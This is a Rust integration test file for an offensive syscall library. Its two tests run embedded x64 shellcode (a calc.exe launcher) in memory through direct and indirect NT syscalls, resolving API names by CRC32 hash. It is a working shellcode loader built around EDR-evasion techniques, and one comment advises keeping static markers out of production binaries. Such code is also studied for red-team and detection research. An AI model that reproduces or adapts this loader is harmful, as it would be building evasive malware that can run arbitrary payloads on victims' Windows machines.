// integration_tests.rs (or append to tests.rs)
//
#[cfg(test)]
mod integration_tests {
    use hashing::hash::compute_crc32_hash;
    use std::{collections::HashMap, mem, ptr};
    use syscalls::{
        prepare_direct_syscall, prepare_indirect_syscall, run_direct_syscall, run_indirect_syscall,
    };
    use windows::Win32::Foundation::{FALSE, HANDLE};
    use windows::Win32::System::Kernel::NULL64;
    use windows::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{GetThreadId, THREAD_ALL_ACCESS};

    // calc.exe
    const PAYLOAD: [u8; 272] = [
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
        0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9,
        0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48,
        0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
        0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48,
        0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C,
        0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
        0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04,
        0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48,
        0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F,
        0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB,
        0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C,
        0x63, 0x00,
    ];

    fn resolve_hashes_for(names: &[&str]) -> HashMap<String, u32> {
        let mut map = HashMap::new();
        for &name in names {
            let hash = compute_crc32_hash(name.as_bytes());
            map.insert(name.to_string(), hash);
        }
        map
    }

    #[test]
    fn test_direct_syscall_runtime_hashes() {
        // NOTE: Do NOT hardcode syscall names or CRC32 hash constants in production binaries.
        // Resolving syscall names at runtime (or embedding a secure resolution mechanism)
        // reduces the risk of mismatches across Windows versions and avoids leaking static
        // markers in the final artifact.
        let target_names = [
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtCreateThreadEx",
            "NtWaitForSingleObject",
        ];

        let hashes = resolve_hashes_for(&target_names);

        let mut p_address: *mut std::ffi::c_void = ptr::null_mut();
        let mut s_payload: usize = mem::size_of_val(&PAYLOAD);
        let old_protection: u32 = 0;

        unsafe {
            // allocate memory (runtime resolved hash)
            prepare_direct_syscall(*hashes.get("NtAllocateVirtualMemory").expect("hash missing"));
            let status: usize = run_direct_syscall(
                -1isize,
                &mut p_address,
                0usize,
                &mut s_payload,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            assert_eq!(
                status, 0x00,
                "[!] NtAllocateVirtualMemory (direct) failed: {:x}",
                status
            );
            assert!(
                !p_address.is_null(),
                "[!] NtAllocateVirtualMemory returned NULL"
            );

            // copy placeholder payload
            ptr::copy_nonoverlapping(PAYLOAD.as_ptr(), p_address as _, s_payload);

            // change protection
            prepare_direct_syscall(*hashes.get("NtProtectVirtualMemory").expect("hash missing"));
            let status: usize = run_direct_syscall(
                -1isize,
                &mut p_address,
                &mut s_payload,
                PAGE_EXECUTE_READ,
                &old_protection,
            );
            assert_eq!(
                status, 0x00,
                "[!] NtProtectVirtualMemory (direct) failed: {:x}",
                status
            );

            // create thread
            prepare_direct_syscall(*hashes.get("NtCreateThreadEx").expect("hash missing"));
            let mut h_thread: HANDLE = HANDLE::default();
            let status: usize = run_direct_syscall(
                &mut h_thread,
                THREAD_ALL_ACCESS.0 as usize,
                NULL64,
                -1isize,
                p_address,
                NULL64,
                0i32,
                NULL64,
                NULL64,
                NULL64,
                NULL64,
            );
            assert_eq!(
                status, 0x00,
                "[!] NtCreateThreadEx (direct) failed: {:x}",
                status
            );

            println!(
                "[+] Direct: Thread {} created of entry: {:?}",
                GetThreadId(h_thread),
                p_address
            );

            // wait for thread
            prepare_direct_syscall(*hashes.get("NtWaitForSingleObject").expect("hash missing"));
            let status: usize = run_direct_syscall(h_thread, FALSE, NULL64);
            assert_eq!(
                status, 0x00,
                "[!] NtWaitForSingleObject (direct) failed: {:x}",
                status
            );
        }
    }

    #[test]
    fn test_indirect_syscall_runtime_hashes() {
        // Same runtime resolution but for indirect path
        let target_names = [
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtCreateThreadEx",
            "NtWaitForSingleObject",
        ];

        let hashes = resolve_hashes_for(&target_names);

        let mut p_address: *mut std::ffi::c_void = ptr::null_mut();
        let mut s_payload: usize = mem::size_of_val(&PAYLOAD);
        let old_protection: u32 = 0;

        unsafe {
            // allocate memory using indirect syscall path
            prepare_indirect_syscall(*hashes.get("NtAllocateVirtualMemory").expect("hash missing"));
            let status: usize = run_indirect_syscall(
                -1isize,
                &mut p_address,
                0usize,
                &mut s_payload,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            assert_eq!(
                status, 0x00,
                "[!] NtAllocateVirtualMemory (indirect) failed: {:x}",
                status
            );
            assert!(
                !p_address.is_null(),
                "[!] NtAllocateVirtualMemory (indirect) returned NULL"
            );

            // copy placeholder payload
            ptr::copy_nonoverlapping(PAYLOAD.as_ptr(), p_address as _, s_payload);

            // change protection
            prepare_indirect_syscall(*hashes.get("NtProtectVirtualMemory").expect("hash missing"));
            let status: usize = run_indirect_syscall(
                -1isize,
                &mut p_address,
                &mut s_payload,
                PAGE_EXECUTE_READ,
                &old_protection,
            );
            assert_eq!(
                status, 0x00,
                "[!] NtProtectVirtualMemory (indirect) failed: {:x}",
                status
            );

            // create thread
            prepare_indirect_syscall(*hashes.get("NtCreateThreadEx").expect("hash missing"));
            let mut h_thread: HANDLE = HANDLE::default();
            let status: usize = run_indirect_syscall(
                &mut h_thread,
                THREAD_ALL_ACCESS.0 as usize,
                NULL64,
                -1isize,
                p_address,
                NULL64,
                0i32,
                NULL64,
                NULL64,
                NULL64,
                NULL64,
            );
            assert_eq!(
                status, 0x00,
                "[!] NtCreateThreadEx (indirect) failed: {:x}",
                status
            );

            println!("[+] Indirect: Thread created of entry: {:?}", p_address);

            // wait for thread
            prepare_indirect_syscall(*hashes.get("NtWaitForSingleObject").expect("hash missing"));
            let status: usize = run_indirect_syscall(h_thread, FALSE, NULL64);
            assert_eq!(
                status, 0x00,
                "[!] NtWaitForSingleObject (indirect) failed: {:x}",
                status
            );
        }
    }
}
